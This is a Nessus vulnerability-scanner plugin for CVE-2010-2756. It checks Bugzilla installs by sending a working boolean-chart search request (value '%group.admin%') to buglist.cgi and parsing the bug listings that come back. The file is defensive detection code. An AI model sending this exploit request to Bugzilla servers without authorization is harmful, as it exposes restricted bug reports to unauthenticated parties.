#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(48316);
  script_version("$Revision: 1.12 $");
  script_cvs_date("$Date: 2016/05/04 14:30:40 $");

  script_cve_id("CVE-2010-2756");
  script_bugtraq_id(42275);
  script_osvdb_id(67196);
  script_xref(name:"Secunia", value:"40892");

  script_name(english:"Bugzilla 'reporter' field Information Disclosure");
  script_summary(english:"Retrieves bug listing using reporter field");

  script_set_attribute(attribute:"synopsis", value:
"A CGI script hosted on the remote web server is affected by an
information disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Bugzilla hosted on the remote web server allows an
unauthenticated, remote attacker to perform a boolean chart search
using the 'reporter' field set to an arbitrary group.

An attacker could leverage this issue to search for bugs that were
reported by users belonging to one more groups, even though the
attacker is not a member of such groups.

Although Nessus has not checked for them, the installed version is
also likely to be affected by several other vulnerabilities, including
remote information disclosure, denial of service and notification
bypass.");

  script_set_attribute(attribute:"see_also", value:"https://bugzilla.mozilla.org/show_bug.cgi?id=417048");
  script_set_attribute(attribute:"see_also", value:"http://www.bugzilla.org/security/3.2.7/");
  script_set_attribute(attribute:"solution", value:"Upgrade to Bugzilla version 3.2.8 / 3.4.8 / 3.6.2 / 3.7.3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/08/05");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/08/05");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/08/12");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:mozilla:bugzilla");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("bugzilla_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Bugzilla");

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");
include("url_func.inc");

app = 'Bugzilla';
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80);

install = get_single_install(
  app_name : app,
  port     : port,
  exit_if_unknown_ver : TRUE
);
path = install["path"];
version = install["version"];

request = urlencode(str:'field0-0-0=reporter&type0-0-0=equals&value0-0-0=%group.admin%',case_type:HEX_UPPERCASE);

          # Advanced search
exploit = 'buglist.cgi?query_format=advanced&' +
          # Get bugs from all possible status
          'bug_status=UNCONFIRMED&bug_status=NEW&bug_status=ASSIGNED&bug_status=REOPENED&bug_status=RESOLVED&bug_status=VERIFIED&bug_status=CLOSED&' +
          # Now create our boolean chart search for bugs
          # ReportedBy user belonging to admin group.
          request;

install_loc = build_url(port:port, qs:path);
url = install_loc + exploit;

res = http_send_recv3(method:"GET",
        item:url,
        port:port,
        exit_on_fail:TRUE,
        add_headers: make_array("Cookie","LANG=en"));

# If we didn't receive an error saying admin group does not exist
# AND
# if we were able to get search results

showbug_pat = 'href="show_bug.cgi\\?id=[0-9]+">([0-9]+)</a>';

if (
  # Pathced version results in an error.
  "The group you specified, admin, is not valid here" >!< res[2] &&
  '<a href="query.cgi?'+request >< res[2]    && # if we see our query
  '<tr class="bz_bugitem'          >< res[2] &&
  '<span class="bz_result_count">' >< res[2] &&
  '<td class="first-child'         >< res[2] &&
  egrep(pattern:'(One|[0-9]+) (bug|issue)s? found.',string:res[2]) && # We've got results.
  egrep(pattern:showbug_pat,string:res[2]) # And the links to the bugs.
  )
{
  if (report_verbosity > 0)
  {
    report = '\n' +
      'Nessus was able to perform a boolean chart search for bugs\n'+
      'that were reported by an user belonging to the admin group \n'+
      'using the following URL :\n'+
      '\n'+
      build_url(port:port, qs:url) + '\n';

    if (report_verbosity > 1)
    {
      info = '';
      max_bugs = 10;

      # Get individual bug listing...
      flag      =  0;
      bug_count =  0;
      id        =  NULL;

      foreach line (split(res[2]))
      {
        if (bug_count >= max_bugs) break;

        if ('<td class="first-child' >< line)
          flag = 1;

        if (flag && ereg(pattern:showbug_pat,string:line))
        {
          matches = eregmatch(pattern:showbug_pat,string:line);
          if (matches && matches[1])
          {
            id = matches[1];
            info += install_loc+"show_bug.cgi?id="+id + '\n';

            id = NULL;
            flag = 0;
            bug_count++;
          }
        }
      }
      if (info)
        report += '\n' +
          'Here\'s the list of bugs (limited to '+ max_bugs+') that matched\n'+
          'the query : \n\n'+
          info;
    }
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_loc, version);
